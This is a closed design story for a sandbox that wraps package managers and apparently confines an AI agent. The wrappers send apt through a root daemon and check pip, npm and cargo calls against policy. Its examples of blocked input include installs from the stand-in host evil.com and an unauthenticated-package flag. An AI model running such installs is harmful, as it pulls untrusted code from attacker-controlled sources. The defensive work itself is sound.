# US-7.2: Package Manager Wrappers

**Epic:** 7 — Runtime Interception Layer
**Status:** Closed — Architecture incompatible with current codebase (see issue #40 and epic README)
**Dependencies:** US-7.1 (System Daemon — for apt wrapper)

## Objective

Build compiled Go wrapper binaries that replace package manager binaries at their canonical paths. Two categories:

1. **System package managers** (apt) → forward to daemon for root execution
2. **Language package managers** (pip, npm, cargo) → enforce policy inline (no root needed)

## Design

### Binary Relocation (at image build time)

```dockerfile
RUN mkdir -p /opt/llmsafespace/.bin && \
    mv /usr/bin/apt /opt/llmsafespace/.bin/apt && \
    mv /usr/bin/apt-get /opt/llmsafespace/.bin/apt-get && \
    chown -R root:root /opt/llmsafespace/.bin && \
    chmod 750 /opt/llmsafespace/.bin

# Wrapper installed at original paths
COPY --chmod=755 wrapper /usr/bin/apt
COPY --chmod=755 wrapper /usr/bin/apt-get
```

`/opt/llmsafespace/.bin/` is root:root 750 — UID 1000 cannot read or execute directly.

### Single Multi-Call Binary

One compiled Go binary, behavior determined by `argv[0]` (BusyBox pattern):

```go
func main() {
    name := filepath.Base(os.Args[0])
    switch {
    case isSystemPkgMgr(name):   // apt, apt-get, apk
        handleSystemInstall(name)
    case isLangPkgMgr(name):     // pip, pip3, npm, cargo
        handleLangPkgMgr(name)
    default:                     // python3, node, go
        handleLanguageRuntime(name)  // US-7.3
    }
}
```

Hard links at each path point to the same binary.

### System Package Managers (apt → daemon)

```go
func handleSystemInstall(name string) {
    conn, err := net.Dial("unix", "/run/llmsafespace/system.sock")
    if err != nil {
        fmt.Fprintf(os.Stderr, "[llmsafespace] Cannot connect to system daemon: %v\n", err)
        os.Exit(1)
    }
    // Send request, stream response to stdout/stderr, exit with daemon's exit code
}
```

All apt invocations go through the daemon regardless of subcommand. The daemon decides what's allowed.

### Language Package Managers (pip/npm/cargo — policy only)

These don't need root. They install to user-writable paths:
- `pip install` → `/home/sandbox/.local/` or `--target /workspace/...`
- `npm install` → `./node_modules/` or `-g` to `/home/sandbox/.npm-global/`
- `cargo install` → `/home/sandbox/.cargo/bin/`

The wrapper enforces policy (blocked packages, blocked sources, blocked flags) then exec's the real binary:

```go
func handleLangPkgMgr(name string) {
    policy := loadPolicy(name)  // /etc/llmsafespace/policies/<name>.json
    if policy == nil || !policy.Enabled {
        execReal(name)  // passthrough
        return
    }
    
    if violation := checkPolicy(policy, os.Args[1:]); violation != "" {
        fmt.Fprintf(os.Stderr, "[llmsafespace] Blocked: %s\n", violation)
        fmt.Fprintf(os.Stderr, "[llmsafespace] Policy: /etc/llmsafespace/policies/%s.json\n", name)
        os.Exit(1)
    }
    
    execReal(name)  // policy passed, exec real binary
}
```

### Policy Checks for Language Package Managers

| Check | Example |
|-------|---------|
| Blocked packages | `pip install malicious-pkg` → denied |
| Blocked flags | `pip install --trusted-host evil.com pkg` → denied |
| Source restrictions | `npm install --registry https://evil.com pkg` → denied |

### Error UX

```
$ apt install python3
Reading package lists... Done
Setting up python3 ...
Done.

$ pip install --trusted-host evil.com sketchy
[llmsafespace] Blocked: flag '--trusted-host' is not permitted by policy.
[llmsafespace] Policy: /etc/llmsafespace/policies/pip.json

$ apt install --allow-unauthenticated bad-pkg
[llmsafespace] Blocked: flag '--allow-unauthenticated' is not permitted.
[llmsafespace] Policy: /etc/llmsafespace/daemon/policy.json
```

### What About `npm install -g`?

Global npm installs write to a root-owned path by default. The wrapper reconfigures npm's global prefix to a user-writable location:

```go
// For npm with -g/--global, set prefix to user-writable path
if name == "npm" && hasGlobalFlag(os.Args) {
    os.Setenv("NPM_CONFIG_PREFIX", "/home/sandbox/.npm-global")
}
```

This avoids needing root for global npm installs. The PATH in the container includes `/home/sandbox/.npm-global/bin`.

## Files Created

| File | Purpose |
|------|---------|
| `cmd/wrapper/main.go` | Multi-call dispatch: detect argv[0], route to appropriate handler |
| `cmd/wrapper/system.go` | System package manager handler (apt → daemon socket client) |
| `cmd/wrapper/langpkg.go` | Language package manager handler (pip/npm/cargo → policy check → exec) |
| `cmd/wrapper/policy.go` | Policy loading and checking (shared with US-7.3) |
| `cmd/wrapper/exec.go` | Helper: exec real binary from /opt/llmsafespace/.bin/ |

## Design Note: Wrapper Overwrite Protection

When the daemon runs `apt install python3`, apt installs the real python3 to `/usr/bin/python3` — overwriting our wrapper. The daemon must restore wrappers after every apt operation:

```go
func (d *Daemon) postInstallRestore() {
    for _, name := range knownWrappedBinaries {
        path := canonicalPath(name) // e.g. /usr/bin/python3
        if isOurWrapper(path) {
            continue // still our wrapper, nothing to do
        }
        // apt overwrote it — relocate the new binary and restore wrapper
        os.Rename(path, filepath.Join("/opt/llmsafespace/.bin", name))
        os.Link("/opt/llmsafespace/wrapper", path)
    }
}
```

This runs synchronously after every apt command completes, before returning success to the client. The agent never sees the real binary at the wrapper path.

Alternative (Dockerfile-level): Use `dpkg-divert` for known packages at build time. But this only covers packages known in advance — the post-install hook handles arbitrary packages.

## Acceptance Criteria

1. `apt install python3` succeeds (forwarded to daemon, installed as root)
2. `apt list --installed` succeeds (forwarded to daemon, read-only operation)
3. `pip install requests` succeeds (direct exec, no daemon)
4. `pip install --trusted-host evil.com pkg` blocked by policy
5. `npm install express` succeeds (local install, no daemon)
6. `npm install -g typescript` succeeds (redirected to user-writable prefix)
7. Wrapper binary is <5MB static
8. Wrapper adds <1ms latency for direct-exec path (measured)
9. Real binaries not accessible to UID 1000 (`ls /opt/llmsafespace/.bin/` → permission denied)
10. With no policy file, all package managers pass through
